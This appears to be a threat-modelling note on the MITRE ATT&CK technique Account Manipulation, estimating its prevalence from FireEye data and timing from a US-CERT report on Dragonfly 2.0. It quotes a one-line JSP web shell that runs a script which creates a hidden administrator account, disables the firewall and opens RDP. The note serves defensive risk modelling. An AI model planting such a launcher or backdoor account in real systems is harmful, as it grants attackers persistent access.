# [Account Manipulation](https://attack.mitre.org/techniques/T1098/)

## Context
>Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

## Findings
In the report [m-trends 2020](https://www.fireeye.com/current-threats/annual-threat-report/mtrends.html) from FireEye, they find that Account Manipulation as an attack step was included in 10.13% of all malware attack lifecycles. 

Cant find any other sources at the moment, so if anyone reading this finds more sources with this probability please add them. 

## Time to compromise
According to [MITRE ATT&CK](https://attack.mitre.org/techniques/T1098/), one of the threat groups that use this technique to maintain elevated access is Dragonfly 2.0. The site [us-cert.gov](https://www.us-cert.gov/ncas/alerts/TA18-074A): 
>"To maintain persistence, the threat actors created local administrator accounts within staging targets and placed malicious files within intended targets."

they did this by doing the following:

>The threat actors used scripts to create local administrator accounts disguised as legitimate backup accounts. The initial script “symantec_help.jsp” contained a one-line reference to a malicious script designed to create the local administrator account and manipulate the firewall for remote access. The script was located in “C:\Program Files (x86)\Symantec\Symantec Endpoint Protection Manager\tomcat\webapps\ROOT\”.

The script that was used to do this, symantec_help.jsp, looks like this: 

```<% Runtime.getRuntime().exec("cmd /C \"" + System.getProperty("user.dir") + "\\..\\webapps\\ROOT\\<enu.cmd>\""); %>```. 

This runs the script enu.cmd, is a bit longer, but according to the source listed, above, it does the following:

>"The script “enu.cmd” created an administrator account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access."

Even this script only contains under 40 lines of code, and most of them are just adding some registry entries and configuring some things. Does not seem to me to take very long, and assuming that most other account manipulation procedures will take a similar amount of time, I will assume it to be instant. 

## Result
```Bernoulli(0.101)```

## Discussion
Probably need at least one more source on the prevalence. 